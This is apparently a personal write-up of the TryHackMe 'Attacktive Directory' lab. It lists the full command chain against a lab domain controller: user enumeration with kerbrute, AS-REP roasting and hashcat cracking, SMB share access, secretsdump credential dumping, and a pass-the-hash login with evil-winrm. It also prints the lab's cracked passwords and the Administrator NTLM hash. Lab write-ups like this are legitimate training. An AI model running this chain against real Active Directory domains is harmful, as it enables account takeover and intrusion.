https://tryhackme.com/room/attacktivedirectory

### Table of contents
- [[#1. Setup]]
- [[#2. Enumeration]]
- [[#3. Exploitation]]
- [[#4. Authenticated Enumeration]]
- [[#5. Privilege Escalation]]

___
### 1. Setup
[[#Table of contents|Back to the top]]

Install **`impacket`** (requires Python 3.7)
1. Clone repo
`git clone https://github.com/SecureAuthCorp/impacket.git /opt/impacket`
2. Install Python requirements
`pip3 install -r /opt/impacket/requirements.txt`
3. Run Python setup install script
`cd /opt/impacket/ && python3 ../setup.py install`

If didn't work, try
```shell
sudo git clone https://github.com/SecureAuthCorp/impacket.git /opt/impacket
sudo pip3 install -r /opt/impacket/requirements.txt
cd /opt/impacket/
sudo pip3 install .
sudo python3 setup.py install
```

Install **`Bloodhound`** and **`Neo4j`**
`apt install bloodhound neo4j`

Troubleshooting: `apt update && apt upgrade`

___
### 2. Enumeration
[[#Table of contents|Back to the top]]

`nmap 10.130.191.225`
`enum4linux-ng -A 10.130.191.225 -oA results`

Long domain / DNS domain: `spookysec.local`
Wordlists: `userlist.txt`, `passwordlist.txt`

User enumeration
`kerbrute userenum --dc spookysec.local -d spookysec.local userlist.txt`

--> notable accounts: `svc-admin`, `backup`

___
### 3. Exploitation
[[#Table of contents|Back to the top]]

Find AS-REProastable accounts (Impacket)
`python3.9 /opt/impacket/examples/GetNPUsers.py spookysec.local/Machine1:Password1 -dc-ip 10.130.146.91 -usersfile users.txt -request`
--> svc-admin

`hashcat -m 18200 -a 0 svc-hash.txt passwordlist.txt`
--> management2005

___
### 4. Authenticated Enumeration
[[#Table of contents|Back to the top]]

Username: `svc-admin`
Password: `management2005`

Enumerate shares
`smbclient -L //10.130.146.91 --user=svc-admin --password=management2005`

Access share
`smbclient //10.130.146.91/backup --user=svc-admin --password=management2005`
Download file: `get file_name`

Decrypted on hashes.com: `backup@spookysec.local:backup2517860`

___
### 5. Privilege Escalation
[[#Table of contents|Back to the top]]

**`secretsdump.py`**
`python3.9 /opt/impacket/examples/secretsdump.py spookysec.local/backup:backup2517860@10.130.146.91`

--> `Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc`
--> NTLM hash: `0e0363213e37b94221497260b0bcb4fc` (Sp00kyP4ssw0rd123)

Install Evil-WinRM: `gem install evil-winrm`

Pass the hash attack
`evil-winrm -i 10.130.146.91 -u Administrator -H 0e0363213e37b94221497260b0bcb4fc`